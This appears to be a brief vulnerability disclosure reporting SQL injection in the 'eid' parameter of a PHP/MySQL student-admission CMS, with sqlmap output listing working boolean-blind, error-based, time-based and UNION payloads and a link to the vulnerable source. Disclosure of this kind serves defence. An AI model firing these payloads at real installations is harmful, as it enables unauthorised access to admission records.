# Student-Admission CMS Sqlinjection

## Sqlinjection location 

![image](https://user-images.githubusercontent.com/72059221/182759099-aa9b5cf7-88eb-46ee-9978-7c9af8aff168.png)


#### Sqlmap Attack

![image](https://user-images.githubusercontent.com/72059221/182759209-d192c812-572e-42ca-b63c-4b707d1d8101.png)


```
[11:29:01] [INFO] GET parameter 'eid' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
GET parameter 'eid' is vulnerable. Do you want to keep testing the others (if any)? [y/N]

sqlmap identified the following injection point(s) with a total of 142 HTTP(s) requests:
---
Parameter: eid (GET)
    Type: boolean-based blind
    Title: Boolean-based blind - Parameter replace (original value)
    Payload: a=edit&eid=(SELECT (CASE WHEN (5950=5950) THEN 8 ELSE (SELECT 9749 UNION SELECT 6556) END))

    Type: error-based
    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: a=edit&eid=8 OR (SELECT 5422 FROM(SELECT COUNT(*),CONCAT(0x717a766a71,(SELECT (ELT(5422=5422,1))),0x7170707871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: a=edit&eid=8 AND (SELECT 8871 FROM (SELECT(SLEEP(5)))pMGL)

    Type: UNION query
    Title: Generic UNION query (NULL) - 11 columns
    Payload: a=edit&eid=-4536 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x717a766a71,0x4764484f4a426d4d6147624c54525076594d64476745676f7750505173707247795a6c584d434842,0x7170707871),NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -
---
[11:29:02] [INFO] the back-end DBMS is MySQL
web application technology: PHP 5.6.9, Apache 2.4.39
back-end DBMS: MySQL >= 5.0
```

## Code Download

https://www.sourcecodester.com/php/15514/online-admission-system-php-and-mysql.html
